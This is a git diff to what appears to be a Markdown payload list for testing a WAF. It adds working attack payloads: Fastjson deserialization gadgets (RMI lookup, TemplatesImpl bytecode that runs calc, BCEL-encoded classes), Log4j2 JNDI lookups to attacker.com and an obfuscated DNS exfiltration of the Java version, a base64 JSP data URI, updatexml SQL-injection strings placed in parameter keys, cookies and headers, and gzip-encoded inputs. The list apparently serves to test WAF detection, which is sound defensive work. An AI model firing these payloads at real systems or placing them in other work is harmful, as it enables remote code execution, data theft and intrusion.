@@ -152,6 +152,97 @@ T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager)
 ```
 
 
+#Fastjson 
+```
+
+
+{
+    "a": {
+        "@type": "java.lang.Class", 
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    }, 
+    "b": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl", 
+        "dataSourceName": "rmi://127.0.0.1:1099/Object", 
+        "autoCommit": true
+    }
+}
+
+{
+    "a": {
+        "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", 
+        "_bytecodes": [
+            "yv66vgAAADQALAcAAgEAGHBheWxvYWQvVGVtcGxhdGVzSW1wbGNtZAcABAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYBAApFeGNlcHRpb25zBwAJAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABENvZGUKAAMADAwABQAGCgAOABAHAA8BABFqYXZhL2xhbmcvUnVudGltZQwAEQASAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgAFAEABGNhbGMKAA4AFgwAFwAYAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABpMcGF5bG9hZC9UZW1wbGF0ZXNJbXBsY21kOwEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHACcBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsY21kLmphdmEAIQABAAMAAAAAAAMAAQAFAAYAAgAHAAAABAABAAgACgAAAEAAAgABAAAADiq3AAu4AA0SE7YAFVexAAAAAgAZAAAADgADAAAACgAEAAsADQAMABoAAAAMAAEAAAAOABsAHAAAAAEAHQAeAAEACgAAAEkAAAAEAAAAAbEAAAACABkAAAAGAAEAAAAPABoAAAAqAAQAAAABABsAHAAAAAAAAQAfACAAAQAAAAEAIQAiAAIAAAABACMAJAADAAEAHQAlAAIABwAAAAQAAQAmAAoAAAA/AAAAAwAAAAGxAAAAAgAZAAAABgABAAAAEgAaAAAAIAADAAAAAQAbABwAAAAAAAEAHwAgAAEAAAABACgAKQACAAEAKgAAAAIAKw=="
+        ], 
+        "_name": "aaa", 
+        "_tfactory": { }, 
+        "_outputProperties": { }
+    }
+}
+
+{
+    {
+    "aaa": {
+            "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource", 
+            "driverClassLoader": {
+                "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+            }, 
+            "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85Uks$SW$Y$7e$OYXX$97$q$Ss$a1$b5i$ec$c5$A$g$b0j$ab$N$a9$adI$d5X$89$c6$90$sE$7b$5b$96$T$dc$U$WfY$3a$fa$8b$fcl$3f$80$d3$cc$d8$8f$9d$e9o$f17$98$3eg$n$JT$9c2$b3$7b$f6$bc$d7$e7$7d$ce$fb$k$fey$f3$e7$x$AW$b1$af$p$q$606$adg$b5$86U$c9$adY5$5b$87$s0$b9o$fdn$e5j$96$5b$cd$3d$u$efK$db$X$88$ae$d85$c7u$fc$h$Cc$a9$f4$8e$80$b6$d6$a8H$D$C1$T$GNQP$b7$iW$60$s$f5$b8p$e2$5e$f4$3d$c7$ad$e6$d3$3b$G$e2$98$d01$$0u$a2$bd$f5$d4$96M$dfi$b8$s$s$R$R$98h$d2$da$_$fa$96$fd$db$b6g$d9$92$92$82$e3$ca$fb$edzYz$dbV$b9FI$a2$d0$b0$ad$da$8e$e59j$df$X$K$3e$d3$85$R$81$f3$C$f1$m$de$86$d5$ec$dbFV$82$3a$M$8ca$ce$c4$8c$ca$ab$f9O$9c$96$c0xa$90$J$ba$g$c7qZ$G$3e$c0$87$3a$e6$FN$9f$a4$d9j$bb$beS$97$s$Wp$8e$d6U$e9$f7$rD$93J$X$de2$ccG$f11k$b2$eb$95$ac$7c$w$Xr$f6$CK$b1U$e8OM$9c$c7$o$91Pn$L$y$a6Fp8$m$da$f4$g$b6l$b5$f2$G$d2$b8$a0$p3$84$aa$af4q$RK$y$8a$a8$ee$ba$cd6i$f5$a4U$X$98$3dB$e64r$D$8a$bc$8e$iO$efH$b3$da$de$db$93$9e$aclI$ab$o$3d$j$9f$J$qGx$f5$d4$G$$$e1$8a$e2$f2$aa$c0$5cjdt$d5$BY$7c$a1$8c$ae$b1$HN$8cz$R$a8$d7$f1$r$c1$fd$b7$ec$d5$b6S$L2$5c$c7$9cz$ad$98$f8$Kl$c2$88$d5lJ$b7$o$b0$f4$3fT$N$85$e1$B$7c$c3n1$U$96U$Tk$f8$96$9dM$7c$V$d5f$CgRo$7b$e6U$d6$db$s$ee$E$b6$7e$a3$t$8d$e1$$$ee$e9$f8nhV$8a$cfZ$be$ac$9b$u$60$83S$d2h$fb$c7M$c9$3a7$7b$ad$j$90a$e0$B$k$ea$d8$3c$g$86a$b5$89$z$U$F$f4$60$Yj$ae$ea$a5wM$d4$f7$8aO$daj$96We$DO$8d$Y$bd$mP$d0$Q$d4$8fh$n$81$90$g$db$e9$91$a7Fe$d9$e3$99$WF$b7$F$f5Z$z$60$$1$wq$a8Uf$d7$bc$f3$y$c8Q$cbgk$ed$ea$90$DL$M$e4$d7Q$j$s8$f0$e7$a4$V$hm$cf$96$b7$j5$cf15$acYe$84s$bc$8e$c6$a0$7ec$88$o$8c$I$f7$3aw$3fp$V$5c$e3$e2$r$a2$cf$R$bd$97$e9$c0$7c$R$884$g$c4i$7e$9a$df$J$ee$40G$N1$beO$c1$a4$sA$89IK$r$9d$c2$Z$ee$a6$f9$f0$de$bcC$3f$8d$8a$99$e3$y$b9$7e$96p$a6$8b$d9$X$fc$I$FQ$p$3d$e1q$q$f5$9d$c4$7b$5cc$ea$e2$a4$d5$fb$B$O$deT$w$8c8O$bd$K$f7$e8$r$ce$s$3e$ea$e0$93$c2$85$OR$h$H$c8$96$Op$a9t$b1$8b$cb$5d$7c$7e$ff$A$d7K$5d$y$_$87$9fc2$ZNj$j$e4$T_$f3$b5$bb$d4$c1$cd$d2$b2$f6$f7$e1$ebd$b8$83$5b$cb$91$3f$b0$9e$8ct$40$8fx$v$Z$e9b$fb$af$80$m$85$zC$E$c0$E$91Lb$9c$92y$d6$b8$c8$w3$ac$f2$g$d7$9b$98$c5$3a$e6$b0I$c4$K$ff$Wy$m2$ec$607$c0$ff$90$d4$96$88$7c$9c$3d$ff$I$8fY$cb$3cV$f0$p$7eb$fc$M$eb$f9$Z$bf$b0$b2$h8$db$ffZ$c4$V$fc$K$8b$V$ae3$5e$99$b2H$c0$e7e$84$O$e9$Q$d1$c1$3f$a0$b4$8e$8a$8e$ac$8e$3d$9d$a3$87C$b26$a4$40$mf$d6$t$B$c7$ce$bf$96$dc$ad$fd$cf$G$A$A"
+        }
+    }:"bbb"
+}
+
+
+
+{
+    {
+        "@type": "com.alibaba.fastjson.JSONObject",
+        "x":{
+                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
+                "driverClassLoader": {
+                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
+                },
+                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
+        }
+    }: "x"
+}
+
+
+```
+
+# Log4j2 反序列化 Payload
+```java
+id=${jndi:ldap://attacker.com/a}
+id=${jndi:rmi://attacker.com/a}
+id=${jndi:dns://attacker.com/a}
+id=${${6pr:-j}nd${env:fm4:-}i:d${xyf::-n}s://${sys:java.version}.218.360.bzpm.amp80l.ceye.io/a}
+
+
+```
+
+
+# base64 JSP
+```
+    data:image/jsp;base64,PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuRGF0ZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnRleHQuU2ltcGxlRGF0ZUZvcm1hdCIgJT4KPCUKICAgIERhdGUgbm93ID0gbmV3IERhdGUoKTsKICAgIFNpbXBsZURhdGVGb3JtYXQgc2RmID0gbmV3IFNpbXBsZURhdGVGb3JtYXQoInl5eXktTU0tZGQgSEg6bW06c3MiKTsKICAgIG91dC5wcmludGxuKCJDdXJyZW50IHN5c3RlbSB0aW1lOiAiICsgc2RmLmZvcm1hdChub3cpKTsKJT4=
+```
+
+
+
+# 通过Kye 传递参数
+```
+/api/blade-log/error/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1
+
+```
+
+# 通过Cookie 传递参数
+```
+Cookie: JSESSIONID=updatexml(1,concat(0x7e,user(),0x7e),1)=1
+```
+
+# 通过Header 传递参数
+```
+CMD:updatexml(1,concat(0x7e,user(),0x7e),1)
+```
 
 
 # 多层编码 自动解码三层 WAF6.8 更新了这个功能
@@ -182,5 +273,12 @@ Unicode编码
 
 如果还需要支持那些编码可以提交issues
 
+
+```
+
+# Gzip 编码
+```
+ud=H4sIACj8I2kC%2FyvIKMjMS8vX0AQA5DkcsgkAAAA%3D
+id=%1F%8B%08%00%28%FC%23i%02%FF%2B%C8%28%C8%CCK%CB%D7%D0%04%00%E49%1C%B2%09%00%00%00
 
 ```
